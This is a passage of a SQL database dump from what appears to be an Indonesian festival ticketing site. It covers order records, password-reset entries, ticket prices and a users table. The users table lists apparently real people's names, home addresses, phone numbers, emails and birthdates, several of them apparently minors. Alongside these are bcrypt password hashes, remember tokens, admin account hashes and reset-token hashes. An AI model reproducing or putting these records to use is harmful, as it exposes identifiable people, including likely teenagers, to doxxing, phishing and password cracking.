('q0T90jwc9CRJ8Ir2irc0Yprdai', 54, 2, 1, 829, '2019-11-29 11:13:28', '2019-11-29', 3, 0, '2019-11-29 10:13:28', '2019-11-29 10:13:28'),
('Q0v6X00tIHwYjvDoRJr3f6cJew', 193, 2, 1, 192, '2019-11-29 13:39:01', '2019-11-29', 3, 0, '2019-11-29 12:39:01', '2019-11-29 12:39:01'),
('qaZ5XsUwkdXUrUdF6esgZGWfWZ', 134, 2, 1, 317, '2019-11-29 06:57:28', '2019-11-29', 3, 0, '2019-11-29 05:57:28', '2019-11-29 05:57:28'),
('QDbMx6jrqWprJQigflNbv4uep5', 157, 2, 2, 396, '2019-11-30 05:37:46', '2019-11-30', 3, 0, '2019-11-30 04:37:46', '2019-11-30 04:37:46'),
('qI9tC7hBHddSHs5sm88FMte2WM', 112, 2, 1, 332, '2019-11-30 09:47:22', '2019-11-30', 3, 0, '2019-11-30 08:47:22', '2019-11-30 08:47:22'),
('QVVwy7T6bp8TXKdcJJSphlX8yO', 48, 2, 1, 571, '2019-11-30 19:28:08', '2019-12-01', 3, 0, '2019-11-30 18:28:08', '2019-11-30 18:28:08'),
('qXsWKV4pr5Wok8jZ2vVibQg16Z', 72, 2, 2, 127, '2019-11-29 03:46:59', '2019-11-29', 1, 1, '2019-11-29 02:46:59', '2020-01-17 08:07:44'),
('R4ro0fl2cjcJbhCROigoP6N4dG', 97, 2, 2, 969, '2019-11-29 04:48:26', '2019-11-29', 1, 0, '2019-11-29 03:48:26', '2019-11-29 08:56:25'),
('r5N8BU5nU3eVpnCyZ6hfjYqtPU', 212, 2, 1, 287, '2019-11-29 17:09:32', '2019-11-29', 1, 0, '2019-11-29 16:09:32', '2019-11-29 16:20:50'),
('rAR7zgS4mig2jydXf5DvPoyW3u', 152, 2, 3, 631, '2019-11-29 08:08:15', '2019-11-29', 3, 0, '2019-11-29 07:08:15', '2019-11-29 07:08:15'),
('RC5OwTNnhMoutFNO70Xfc2mEOP', 183, 2, 2, 512, '2019-11-29 12:03:01', '2019-11-29', 2, 0, '2019-11-29 11:03:01', '2019-12-10 16:31:24'),
('rEG6EAXAwlDMA3nsPZrIPtTo2K', 99, 2, 2, 656, '2019-11-29 04:54:49', '2019-11-29', 3, 0, '2019-11-29 03:54:49', '2019-11-29 03:54:49'),
('RFU0P53Bbmbg5H6KzHwt02wjPO', 121, 2, 1, 595, '2019-11-29 06:36:16', '2019-11-29', 2, 0, '2019-11-29 05:36:16', '2019-12-10 16:14:46'),
('rgI6mwwngHgjFJykqfWjQtya9W', 107, 2, 3, 263, '2019-11-29 05:10:53', '2019-11-29', 3, 0, '2019-11-29 04:10:53', '2019-11-29 04:10:53'),
('rHkG32xNCXMVOGo0XVvIpz3dIY', 127, 2, 1, 143, '2019-11-29 06:52:43', '2019-11-29', 3, 0, '2019-11-29 05:52:43', '2019-11-29 05:52:43'),
('ri2xkxZ2ELfyL7LiXyiDN8ttcG', 177, 2, 1, 98, '2019-11-29 13:40:20', '2019-11-29', 3, 0, '2019-11-29 12:40:20', '2019-11-29 12:40:20'),
('rlsHOC0NNBswXVD62utxg2Z1KO', 158, 2, 1, 797, '2019-11-29 08:59:33', '2019-11-29', 3, 0, '2019-11-29 07:59:33', '2019-11-29 07:59:33'),
('RQAKNSrlauSaRHoNSf95jkkwmV', 156, 2, 2, 739, '2019-11-29 08:28:33', '2019-11-29', 3, 0, '2019-11-29 07:28:33', '2019-11-29 07:28:33'),
('rtQyRDO3sTbzVDJoMuwB4vbF9J', 236, 2, 3, 457, '2019-12-02 09:39:48', '2019-12-02', 3, 0, '2019-12-02 08:39:48', '2019-12-02 08:39:48'),
('rzGNKmNKhop4LqgTiZZxWP9GE0', 166, 3, 1, 829, '2020-01-15 11:11:33', '2020-01-15', 1, 1, '2020-01-15 10:11:33', '2020-01-15 10:38:22'),
('S0GUj2qjgXXSIZMrh8q2JwXUiC', 101, 2, 1, 985, '2019-11-29 05:13:18', '2019-11-29', 3, 0, '2019-11-29 04:13:18', '2019-11-29 04:13:18'),
('S4IjttMFQvxfyWH1a6EIGkVnNs', 230, 2, 1, 588, '2019-12-01 07:40:31', '2019-12-01', 3, 0, '2019-12-01 06:40:31', '2019-12-01 06:40:31'),
('soJHrALdgPSEFgKdNX5AEGScCP', 109, 2, 2, 698, '2019-11-29 06:21:10', '2019-11-29', 3, 0, '2019-11-29 05:21:10', '2019-11-29 05:21:10'),
('swA5vgK35slHQ7tYgFmeJUwHLY', 132, 2, 1, 731, '2019-11-29 08:10:59', '2019-11-29', 3, 0, '2019-11-29 07:10:59', '2019-11-29 07:10:59'),
('sx8nwfmIF5efRl88fHsQfvT7yI', 161, 2, 1, 364, '2019-11-29 09:12:55', '2019-11-29', 3, 0, '2019-11-29 08:12:55', '2019-11-29 08:12:55'),
('T7rPOEb3TwlzYZomLrB3a8JQ55', 88, 2, 3, 411, '2019-11-29 04:34:13', '2019-11-29', 3, 0, '2019-11-29 03:34:13', '2019-11-29 03:34:13'),
('T7RxGFASrXl8EA0Xhw93z047kZ', 79, 2, 2, 229, '2019-11-29 04:15:12', '2019-11-29', 2, 0, '2019-11-29 03:15:12', '2019-12-15 14:54:28'),
('TG3uVXeLSTOkZS3urAitpNbmJZ', 190, 2, 3, 990, '2019-11-29 13:18:45', '2019-11-29', 1, 1, '2019-11-29 12:18:45', '2020-01-15 08:42:47'),
('TjDX32YT6ymH4FrIxAvT0SsO90', 75, 2, 3, 85, '2019-11-29 03:57:59', '2019-11-29', 3, 0, '2019-11-29 02:57:59', '2019-11-29 02:57:59'),
('TP327p33HWnFvdFwp3v4RCS6qH', 118, 2, 3, 358, '2019-11-29 05:54:28', '2019-11-29', 3, 0, '2019-11-29 04:54:28', '2019-11-29 04:54:28'),
('tR9rBpCW1RGOCLqCNzPIyNDiBh', 229, 2, 2, 586, '2019-12-01 05:18:58', '2019-12-01', 3, 0, '2019-12-01 04:18:58', '2019-12-01 04:18:58'),
('ttr8gNnVbozGmjwPXn8mtOrFC8', 116, 2, 3, 598, '2019-11-29 05:57:13', '2019-11-29', 3, 0, '2019-11-29 04:57:13', '2019-11-29 04:57:13'),
('tVWrsO4TKmf6d3tFeBZEglEuQh', 150, 2, 2, 591, '2019-11-29 08:01:22', '2019-11-29', 3, 0, '2019-11-29 07:01:22', '2019-11-29 07:01:22'),
('U06IjANOLmFECZiCvgAm25hq6Z', 217, 2, 1, 745, '2019-11-30 06:09:12', '2019-11-30', 2, 0, '2019-11-30 05:09:12', '2019-11-30 10:27:11'),
('U8Jth29HUkuNRzKs2a2mMrHRCE', 50, 2, 2, 397, '2019-11-29 03:53:56', '2019-11-29', 3, 0, '2019-11-29 02:53:56', '2019-11-29 02:53:56'),
('u9s3hvghRdzG5c8aZYtKrNDjcB', 45, 2, 3, 224, '2019-11-29 04:00:05', '2019-11-29', 2, 0, '2019-11-29 03:00:05', '2019-12-08 14:00:26'),
('uFA5PxeqgTpUX3XL3563WPZDMT', 146, 2, 3, 868, '2019-11-29 07:51:42', '2019-11-29', 3, 0, '2019-11-29 06:51:42', '2019-11-29 06:51:42'),
('UGdV3VIUpgADQytrL6pybC6vCL', 55, 2, 3, 943, '2019-11-29 04:20:58', '2019-11-29', 3, 0, '2019-11-29 03:20:58', '2019-11-29 03:20:58'),
('uI8V4608JfvVS0xb7U4KxomIWo', 141, 2, 1, 877, '2019-11-29 08:25:42', '2019-11-29', 3, 0, '2019-11-29 07:25:42', '2019-11-29 07:25:42'),
('uLfPrALhugLex6RBdtjDoNiTlU', 174, 2, 1, 33, '2019-11-29 11:28:04', '2019-11-29', 3, 0, '2019-11-29 10:28:04', '2019-11-29 10:28:04'),
('uPkhicaHwK67n44ktIYygsWLE2', 64, 2, 1, 370, '2019-11-29 04:45:40', '2019-11-29', 3, 0, '2019-11-29 03:45:40', '2019-11-29 03:45:40'),
('uTcTVcCo5UscbTC4mY7e1zoJA9', 198, 2, 1, 494, '2019-11-29 14:24:02', '2019-11-29', 3, 0, '2019-11-29 13:24:02', '2019-11-29 13:24:02'),
('uyUhGCpDnHnGXbgnvvsrUMGzrq', 267, 3, 1, 739, '2020-01-08 05:22:45', '2020-01-08', 3, 0, '2020-01-08 04:22:45', '2020-01-08 04:22:45'),
('UzFWE9IOTZCVtyZCjD5oPUs1LN', 251, 3, 1, 26, '2020-01-08 11:41:28', '2020-01-08', 1, 1, '2020-01-08 10:41:28', '2020-01-16 10:27:18'),
('V92kfSNvqPeP41tr7Kw9owJVKe', 36, 1, 1, 129, '2019-11-27 02:52:36', '2019-11-26', 2, 0, '2019-11-26 02:52:36', '2019-11-26 13:30:01'),
('vIjV8eXLIwbUP3Tevruuqb4Maq', 98, 2, 1, 326, '2019-11-29 05:13:59', '2019-11-29', 2, 0, '2019-11-29 04:13:59', '2019-11-29 08:06:14'),
('VJVpTfHnhnSBJf5jIohAPFFea9', 162, 2, 2, 950, '2019-11-29 09:19:12', '2019-11-29', 2, 0, '2019-11-29 08:19:12', '2019-12-11 16:18:42'),
('w368x2bjSbVy4lYpJ1Me3Kgu18', 281, 3, 2, 625, '2020-01-15 14:58:18', '2020-01-15', 1, 1, '2020-01-15 13:58:18', '2020-01-17 07:58:04'),
('w6KhshK9Pb1FYurS63aVQvnftP', 84, 2, 2, 384, '2019-11-29 06:36:10', '2019-11-29', 3, 0, '2019-11-29 05:36:10', '2019-11-29 05:36:10'),
('wiSYdGbfeMuyqtd0hVe0OEXCIj', 280, 3, 1, 699, '2020-01-15 09:02:09', '2020-01-15', 1, 1, '2020-01-15 08:02:09', '2020-01-15 10:29:36'),
('wmrMvhW6Gs40qhjBcS4PT9L0ME', 187, 2, 3, 838, '2019-11-29 12:45:55', '2019-11-29', 3, 0, '2019-11-29 11:45:55', '2019-11-29 11:45:55'),
('wn1Wcp7KOQsRYeCTUzJ5QdH29o', 174, 2, 1, 96, '2019-11-29 11:45:59', '2019-11-29', 2, 0, '2019-11-29 10:45:59', '2019-11-30 04:02:01'),
('wrr3xxeMJvbObBfOc2yVnOkDHF', 164, 2, 2, 258, '2019-11-29 16:06:01', '2019-11-29', 3, 0, '2019-11-29 15:06:01', '2019-11-29 15:06:01'),
('Wtvz6Lv6QQm58JVqVv9FTKbnZn', 58, 3, 1, 312, '2020-01-12 10:49:35', '2020-01-12', 3, 0, '2020-01-12 09:49:35', '2020-01-12 09:49:35'),
('wxAyK1qyYa1iVbiLw2h1rj39fa', 57, 2, 1, 362, '2019-11-29 10:35:09', '2019-11-29', 3, 0, '2019-11-29 09:35:09', '2019-11-29 09:35:09'),
('X0uEBjWxOzxyuSzc1eedJI6biC', 52, 2, 1, 887, '2019-11-29 04:49:37', '2019-11-29', 2, 0, '2019-11-29 03:49:37', '2019-12-11 16:20:21'),
('X2z1vsPbhKgWxoXonlfVi4gWZM', 257, 3, 1, 696, '2020-01-07 08:33:35', '2020-01-07', 1, 1, '2020-01-07 07:33:35', '2020-01-15 07:23:54'),
('X4Ae4OKsC2n5KaHfm9gJ1kwh2A', 201, 2, 2, 704, '2019-11-29 15:25:40', '2019-11-29', 1, 0, '2019-11-29 14:25:40', '2019-11-29 15:19:05'),
('xQCu4I8qQhvSBQdZ5lNZP8Dnuz', 58, 3, 1, 721, '2020-01-12 15:17:24', '2020-01-12', 1, 1, '2020-01-12 14:17:24', '2020-01-19 06:40:17'),
('Xsr7H8A5vVHeRg262mGh4iPzVd', 103, 2, 2, 614, '2019-11-29 05:01:41', '2019-11-29', 3, 0, '2019-11-29 04:01:41', '2019-11-29 04:01:41'),
('xsxnTfZ9eDSe3ctMPHmazMvLlC', 240, 2, 2, 557, '2020-01-16 08:59:37', '2020-01-16', 1, 1, '2020-01-16 07:59:37', '2020-01-16 08:15:37'),
('yytiX0elsiUoO6J6dly9VStflm', 200, 2, 3, 910, '2019-11-29 15:01:57', '2019-11-29', 3, 0, '2019-11-29 14:01:57', '2019-11-29 14:01:57'),
('yzd5o64q9obLUKpDJiRwXePv6j', 87, 2, 1, 944, '2019-11-29 04:31:00', '2019-11-29', 3, 0, '2019-11-29 03:31:00', '2019-11-29 03:31:00'),
('zDcQN0cDtL2BRZpXOPyYUHE1jQ', 251, 2, 1, 975, '2019-12-24 05:17:09', '2019-12-24', 3, 0, '2019-12-24 04:17:09', '2019-12-24 04:17:09'),
('ZjNBnnfIDCYozUJKYr9o4LlI27', 90, 2, 1, 151, '2019-11-30 00:59:23', '2019-11-30', 3, 0, '2019-11-29 23:59:23', '2019-11-29 23:59:23'),
('znfedZYkI9KulXi5xCVYxFtbT9', 128, 2, 1, 492, '2019-11-29 06:35:16', '2019-11-29', 3, 0, '2019-11-29 05:35:16', '2019-11-29 05:35:16'),
('zR3VXsgU56eDyf0dTCrh9satvW', 123, 2, 2, 600, '2019-11-29 06:09:24', '2019-11-29', 3, 0, '2019-11-29 05:09:24', '2019-11-29 05:09:24'),
('ztna8pQpsvc2JQRTDi5CSkmDIb', 54, 2, 2, 503, '2019-11-29 11:36:20', '2019-11-29', 3, 0, '2019-11-29 10:36:20', '2019-11-29 10:36:20'),
('ZYbID1JjUBxva3FjXMtnekJxFx', 209, 2, 3, 759, '2019-11-29 16:36:14', '2019-11-29', 3, 0, '2019-11-29 15:36:14', '2019-11-29 15:36:14');

-- --------------------------------------------------------

--
-- Struktur dari tabel `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data untuk tabel `password_resets`
--

INSERT INTO `password_resets` (`email`, `token`, `created_at`) VALUES
('imgoonep@gmail.com', '$2y$10$Mdv4uI3ag4M02eTmcGJDaOBZ2y1oqj4tWA0YhHLRQ1LnYSyXfj3Qu', '2019-11-24 02:50:33'),
('me@hanifz.com', '$2y$10$H9QWI7ov6XRlMEAaAlM3buepRt7nbI7XhkyK4y0Rco09xwLX4qYja', '2019-11-24 12:26:04'),
('muhammadamiirulbilaal15@gmail.com', '$2y$10$jXRrNFnF20f3Sx2lCXkdkehr34IgPqTAHloI7P63vEPGjLcHmefAq', '2019-11-29 03:47:49'),
('Ratihnurjannah123@gmail.com', '$2y$10$08PH7odqwJ1jaFIuE9s1C.4pJE/exWRW8t0eTz2Rtr6OOAoYjn4si', '2019-11-29 07:03:31'),
('gilang.paradise121201@gmail.com', '$2y$10$yGN9U0Udl9jgPH4OW3GKReEdBcAUIP13G7b68f/f2xXYnmRgJJrxS', '2019-12-02 13:18:46'),
('gg@gmail.com', '$2y$10$XASk3pV7R3658z5HewNNsuyBFxxsDTBXpbaoDDU.VwIqAK19u7zn.', '2019-12-30 19:54:36'),
('nabilladwii44@gmail.com', '$2y$10$/lqLse.yYTR4HzS2QgsGH.GMKgoH0SzzhP8/S.tclwVFS4vCNaa9W', '2020-01-15 09:00:22');

-- --------------------------------------------------------

--
-- Struktur dari tabel `ticket`
--

CREATE TABLE `ticket` (
  `id_ticket` int(11) NOT NULL,
  `jenis_ticket` varchar(255) NOT NULL,
  `harga_ticket` int(11) NOT NULL,
  `stok` int(11) NOT NULL,
  `status_ticket` tinyint(1) NOT NULL,
  `akhir_ticket` date NOT NULL,
  `img_ticket` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `ticket`
--

INSERT INTO `ticket` (`id_ticket`, `jenis_ticket`, `harga_ticket`, `stok`, `status_ticket`, `akhir_ticket`, `img_ticket`) VALUES
(1, 'Presale 1', 40000, 4, 0, '2019-11-27', 'A (1).png'),
(2, 'Presale 2', 50000, 296, 1, '2019-12-31', 'A (2).png'),
(3, 'Presale 3', 55000, 285, 1, '2020-01-18', 'A (3).png');

-- --------------------------------------------------------

--
-- Struktur dari tabel `users`
--

CREATE TABLE `users` (
  `id_users` bigint(20) UNSIGNED NOT NULL,
  `nama_users` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `alamat_users` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `notelp_users` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `isAdmin` tinyint(1) NOT NULL DEFAULT '0',
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `jenkel_users` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tgllahir_users` date NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data untuk tabel `users`
--

INSERT INTO `users` (`id_users`, `nama_users`, `alamat_users`, `notelp_users`, `isAdmin`, `email`, `email_verified_at`, `password`, `jenkel_users`, `tgllahir_users`, `remember_token`, `created_at`, `updated_at`) VALUES
(1, 'Hanif', 'Telkom', '081380004696', 1, 'me@hanifz.com', '2019-11-11 18:00:00', '$2y$10$W/H4SWq9PodiW4lJZ7/VquouKZijXXf.tCpL5llcr0K44xAtMrk1.', 'Laki-Laki', '2002-09-12', 'DMf9yjM55HRY0hUyzeTgazu4o1dEYdnDhKNygSMGpZu6yvaxzARwKfqc9U1a', '2019-11-08 03:34:56', '2019-11-24 12:29:39'),
(24, 'Admin 01', 'Admin', '0', 1, 'admin01@biggest.telesandifestival.com', '2019-11-23 18:00:00', '$2y$10$na8L2.K8QpDl6Y6RCs9DfewgMQpJm3S7s4GQdwRTJu1EM8IaAqOo6', 'Laki-Laki', '2019-11-24', NULL, '2019-11-24 12:35:32', '2019-11-24 12:35:32'),
(25, 'Admin 02', 'Admin', '0', 1, 'admin02@biggest.telesandifestival.com', '2019-11-23 18:00:00', '$2y$10$8t4qB.D9MGsx.yNrw5ZEsO3FFE1lTsjTzw8ZSmDuvqArfztz3GGV.', 'Laki-Laki', '2019-11-24', NULL, '2019-11-24 12:36:44', '2019-11-24 12:36:44'),
(26, 'Admin 03', 'Admin', '0', 1, 'admin03@biggest.telesandifestival.com', '2019-11-23 18:00:00', '$2y$10$k3.QtkGYprSlqe/Tairqhekau6Ie25Uqch8DFv/OfPy2W9DYC0UXW', 'Laki-Laki', '2019-11-24', NULL, '2019-11-24 12:38:06', '2019-11-24 12:38:06'),
(27, 'Admin 04', 'Admin', '0', 1, 'admin04@biggest.telesandifestival.com', '2019-11-23 18:00:00', '$2y$10$Xa0s/ciN.DYzrZ3MCbjDRu8REeZlQL6GlpalaO2eFLVugdaOB0AmK', 'Laki-Laki', '2019-11-24', NULL, '2019-11-24 12:38:54', '2019-11-24 12:38:54'),
(28, 'Admin 05', 'Admin', '0', 1, 'admin05@biggest.telesandifestival.com', '2019-11-23 18:00:00', '$2y$10$Me/MeygvujWnh2yKal85yup5pLGMezbSJEkjEzf9C9.OpvX8xuP2m', 'Laki-Laki', '2019-11-24', NULL, '2019-11-24 12:39:41', '2019-11-24 12:39:41'),
(29, 'Ichart Raihant', 'Vilmut', '085314078786', 1, 'chartgans@gmail.com', '2019-11-23 18:00:00', '$2y$10$zvoif5OkaRscCzxFLZ.Y8ufMDr2LpQCzAT08eQL1X7by74199YQZi', 'Laki-Laki', '2002-08-30', NULL, '2019-11-24 12:41:49', '2019-11-24 12:41:49'),
(32, 'Hazby', 'Jl. Raya rawa kalong', '081315413103', 1, 'punyahazby@gmail.com', '2019-11-25 14:36:57', '$2y$10$kDIJxC1L4ELiGZwWpgBglOxP253kRJ1osvw.T8wWBKSnfwSgKuq42', 'Laki-Laki', '2002-03-14', NULL, '2019-11-25 14:35:47', '2019-11-25 14:36:57'),
(35, 'Santika kusuma Wardhani', 'Alamanda regecy blok i-10 no 7/9, tambun utara', '895344550180', 0, 'santika741@gmail.com', '2019-11-26 02:48:26', '$2y$10$1UY6Ps7CkxCUt7Ho.3GDNe5TLHo27mf4.xfspY43PK/xB5y1LinEm', 'Perempuan', '2001-04-07', NULL, '2019-11-26 02:47:46', '2019-11-26 02:48:26'),
(36, 'Riyon Aryono', 'Bekasi', '087727265722', 0, 'riyonaryono12@gmail.com', '2019-11-26 02:52:05', '$2y$10$Ja99/kwPOn4t4CiaZzZ.9ej20tUrpuk46qcLQsrYW7uXe61ybiqga', 'Laki-Laki', '2003-09-03', NULL, '2019-11-26 02:51:50', '2019-11-26 02:52:05'),
(37, 'Rafli Fadilla', 'Graha Melasti Blok Fb 11 No 19 RT 002 RW 014', '081770023358', 0, 'raflifadilla07@gmail.com', '2019-11-28 18:00:00', '$2y$10$qKb8I9oZAEt8acCT9urxouDseZwlg1e2Dk4wjfjFF4zIjWMDAMDdO', 'Laki-Laki', '2001-05-24', NULL, '2019-11-26 02:58:34', '2019-11-26 02:58:34'),
(38, 'Panjul', 'Perumahan graha', '082125814673', 0, 'lerkud4500@gmail.com', '2019-11-26 03:01:43', '$2y$10$4d5ti7r4yBPTfT.myqjDE.yN8ws9h2vlUVPFV1qp6CxfL1vjpH6GW', 'Laki-Laki', '1998-05-04', NULL, '2019-11-26 03:00:52', '2019-11-26 03:01:43'),
(39, 'Arya Gans', 'Rumah bapak gw', '082246986898', 0, 'aryamlna2401@gmail.com', '2019-11-26 03:12:36', '$2y$10$Yfyto38ZrczU0GlgcO4yEeuK8960VYzDAy.f1HNC2yl78Z6K5Aayq', 'Laki-Laki', '2001-12-24', NULL, '2019-11-26 03:11:28', '2019-11-26 03:12:36'),
(40, 'Milati Shofa', 'Villa bekasi indah 2 Blok J1 no.6 sumber jaya,tambun selatan', '081310928677', 0, 'milatishofa7@gmail.com', '2019-11-26 03:14:10', '$2y$10$6vnAhUUIE7Ynxq2DNsufz.2I1DXR1zF0uEF2dGeHLj31Ymv5V.rX6', 'Perempuan', '1999-11-18', NULL, '2019-11-26 03:12:49', '2019-11-26 03:14:10'),
(41, 'Alfida Dwi', 'Bumi Anggrek blok T.339', '0895376449907', 0, 'alfida.dwi5@gmail.com', '2019-11-26 03:46:10', '$2y$10$bPe/rWX6MBHDW8EXujZSduPr3QIoLqmMJ.Re3d.b7W48b3Ysiuj7e', 'Perempuan', '2000-11-05', NULL, '2019-11-26 03:45:41', '2019-11-26 03:46:10'),
(42, 'Eka Deliana', 'Kp. Karang Sambung Rt.01/09 no.121, Karang Satria, Tambun Utara, Bekasi', '081295567005', 0, 'ekadeliana03@gmail.com', '2019-11-26 03:55:35', '$2y$10$7zRLGHFqCSAKBMZU931hgOe1Der8tgQVxDWmcK8.lvaGaFCM4r1ZC', 'Perempuan', '2001-03-28', NULL, '2019-11-26 03:52:08', '2019-11-26 03:55:35'),
(43, 'Rizki Fadhilah M Habibi', 'Graha Melasti blok FB 7 no 10', '082127364377', 0, 'rizkifadhilahmhabibi@gmail.com', '2019-11-26 03:59:38', '$2y$10$4d/1UopeU5EhBV8c3VN3fu12C/Pb1zMAmNwylRAejn6zdtFYyMPFS', 'Laki-Laki', '2001-05-11', NULL, '2019-11-26 03:58:56', '2019-11-26 03:59:38'),
(44, 'Alifah Asof', 'Jl. Bekasi Kaum', '087861521901', 0, 'alifahasofp11@gmail.com', '2019-11-26 04:27:37', '$2y$10$LDAs1j9w/YuNc5c27/1EZeMdF4kM4LhuvonixaZ6sx0swhDrBiuXO', 'Perempuan', '2001-02-09', NULL, '2019-11-26 04:24:24', '2019-11-26 04:27:37'),
(45, 'Rhamadani putra H', 'Perum regensi 1 blok i8 no 50 kec.cibitung', '089643663598', 0, 'mashayadica@gmail.com', '2019-11-26 04:40:32', '$2y$10$II4nWWSDbBORh/EeR5Oyz.VJnIGlt8VJ9cg7HYrPaA15pLOfp19.e', 'Laki-Laki', '2000-11-30', NULL, '2019-11-26 04:39:43', '2019-11-26 04:40:32'),
(46, 'Ajeng puspita sari', 'Jl pulau jawa 5', '0895396792157', 0, 'ajengpuspitasari541@gmail.com', '2019-11-28 18:00:00', '$2y$10$lUnLjkUPF53Q3xolyn5yyu7cy.i9EeZnkXsZWhq7ku/.swf97rAv.', 'Perempuan', '1999-05-08', NULL, '2019-11-26 07:05:05', '2019-11-26 07:05:05'),
(47, 'Rika Amelia', 'Selang cau, cibitung bekasi 17520', '081514276904', 0, 'rkaa57963@gmail.com', '2019-11-28 18:00:00', '$2y$10$SuFMTF/LhDSNkbp1Acqb.eYu/E7yo2Ap0w2bZgtiMG0aNxdExpNBu', 'Perempuan', '2003-06-02', NULL, '2019-11-26 07:23:21', '2019-11-26 07:23:21'),
(48, 'Diana Etikawati', 'Perum Kartika Wanasari Blok f5 no 24 RT 001/RW 031', '081387311884', 0, 'dianaetikawati92@gmail.com', '2019-11-26 07:26:20', '$2y$10$O2zC9PSI38rJs1WfR0o4lON5f9z.pXJxfUAU6gPHlFwaIBQtj5Tjq', 'Perempuan', '1999-02-07', NULL, '2019-11-26 07:25:43', '2019-11-26 07:26:20'),
(49, 'Bima Putra Priyana', 'Perumahan Taman Raya Jl Melati IX Blok K 1No 3 MangunJaya  Tambun Selatan', '08891557391', 0, 'bimaputrapriyana@gmail.com', '2019-11-26 07:32:05', '$2y$10$0oXPEibxxT/jbb71GsqVcOsgNGSLmSxTY3upOP2kQNzudxNelsGne', 'Laki-Laki', '2001-03-03', NULL, '2019-11-26 07:31:32', '2019-11-26 07:32:05'),
(50, 'Arman darmawan', 'Taman alamanda blok c9 no.9', '085893476951', 0, 'armandrmwn05@gmail.com', '2019-11-26 09:28:47', '$2y$10$lCDUypCOgNlcmkeW/6rb0eYPnSwTeeg12dPtJvhmNh2rSiMhHvOFq', 'Laki-Laki', '2002-05-12', NULL, '2019-11-26 09:27:21', '2019-11-26 09:28:47'),
(51, 'twes', 'qwe', '-1', 0, 'test@test.com', '2019-11-25 18:00:00', '$2y$10$dSZ4srhOoPr1m5k2lkM5zuP9E2.lM7fcaIVHXCvDSptX28/bI7/hq', 'Laki-Laki', '2019-12-31', NULL, '2019-11-26 09:56:54', '2019-11-26 09:56:54'),
(52, 'sella oktavia', 'Gg damai', '081296630604', 0, 'sella.oktavia99@gmail.com', '2019-11-29 03:49:19', '$2y$10$xl1YO7RWlxZpTrmUJBYcOOHZBjVKuungKorLmB7ybzgeSewhcpIr.', 'Perempuan', '1999-10-18', 'Xijfcyw7TdPiihWJqg7jJVj38W59vAt81Xk2FNVlfc1eYhw2R9s8qZEWvMCa', '2019-11-26 10:43:37', '2019-12-03 13:56:38'),
(53, 'Fakhri Eko nursaputra', 'Griya asri 2', '0895327680797', 0, 'brucelie119@gmail.com', '2019-11-28 18:00:00', '$2y$10$ga71DetFRu3Trqpg5RxW0.1GWLm9GpoDu/tTSW403eXk58JwrI20a', 'Laki-Laki', '2001-07-26', NULL, '2019-11-26 12:37:00', '2019-11-26 12:37:00'),
(54, 'aldi laksono', 'jl. kalibaru no.16 desa Mekarsari tambun selatan', '087885422508', 0, 'aldilaksono456@gmail.com', '2019-11-26 12:47:56', '$2y$10$g0ekJMYN02NCdOh2rG28lerAMs9WsquHRIwXOMUU.7bNAMtr.Spja', 'Laki-Laki', '2004-03-31', NULL, '2019-11-26 12:46:49', '2019-11-26 12:47:56'),
(55, 'Dwi Nuranggia Apriliani Putri', 'villa mutiara blok m15/32', '085777632213', 0, 'dwinuranggia.123@gmail.com', '2019-11-26 13:45:02', '$2y$10$Zk6.oNNU8QNXsnLLj4s4FOioObg5Af2zwG2VObPkJfiL9BOMgHrcO', 'Perempuan', '2003-04-02', NULL, '2019-11-26 13:44:00', '2019-11-26 13:45:02'),
(56, 'Mohammad Entol Rizky', 'AKUN DEMO', '081323086509', 1, 'kadmaker27@gmail.com', '2019-11-26 14:48:51', '$2y$10$YEHdn4zvTylYUejNKbi0fem3VXxGFUJkkKkTNhybM1SLDFHLB0i4K', 'Laki-Laki', '2001-12-08', NULL, '2019-11-26 14:48:18', '2019-11-26 14:48:51'),
(57, 'Rekhsy Octavian', 'Perumahan Kirana Cibitung Blok I17 Nomor 34', '081387331653', 0, 'reksisans@gmail.com', '2019-11-26 16:00:17', '$2y$10$Phc8xjeuodK3ERk/8j89buz5khQC8u3/SArZx5JMUY.udoPWzNO1K', 'Laki-Laki', '2002-10-21', NULL, '2019-11-26 15:59:53', '2019-11-26 16:00:17'),
(58, 'Bintang Mahar Putra', 'Perumahan Telaga Murni Blok C11/10, Cikarang Barat, Bekasi', '089676049626', 0, 'maharputrabintang@gmail.com', '2019-11-27 06:31:35', '$2y$10$HvgKqhgbHesBqMcZQulaBuFhcYXCvwAZjJrfYSTipO9SAe9XrQd8i', 'Laki-Laki', '2001-04-16', NULL, '2019-11-27 06:31:19', '2019-11-27 06:31:35'),
(59, 'Ferdi Muhammad Roup', 'Jl.Kalibaru Desa Mekarsari,Tambun Selatan,Bekasi,17510', '081282673182', 0, 'ferdimroup12@gmail.com', '2019-11-27 14:55:29', '$2y$10$3PFZp5ukTlR4dAVNrtsriO86oOuTdOpeR/hmGeU6.sN3wEQ14V3xm', 'Laki-Laki', '2003-05-18', 'uWQYBoxr4uaIselE913N9UGcS938vnx21kB2XOfUynieW2Odc2mrSgdbD7eP', '2019-11-27 14:50:53', '2019-11-29 03:29:52'),
(60, 'Bagas melvin pramudya', 'Bekasi utara', '087721825780', 0, 'bagasmelvin36@gmail.com', '2019-11-27 18:07:18', '$2y$10$3D9hFd4Dth/5hudgV4WYYev04K9LjIR/XwKoGuocZvbByCIH6dyt.', 'Laki-Laki', '2001-05-16', NULL, '2019-11-27 18:06:53', '2019-11-27 18:07:18'),
